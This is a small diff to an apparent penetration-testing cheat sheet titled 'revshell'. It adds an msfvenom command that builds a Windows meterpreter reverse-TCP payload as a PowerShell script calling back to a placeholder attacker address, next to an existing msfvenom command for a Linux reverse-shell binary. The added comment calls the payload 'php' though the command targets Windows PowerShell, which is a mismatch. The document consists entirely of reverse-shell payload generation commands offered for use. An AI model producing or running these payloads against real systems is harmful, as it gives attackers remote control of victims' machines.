@@ -1,4 +1,7 @@
 % revshell
 
+# php meterpreter reverse shell
+msfvenom -p windows/x64/meterpreter_reverse_tcp -f psh LHOST=<attackip> -o payload.ps1
+
 # Linux reverse shell binary
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o <outputfile>
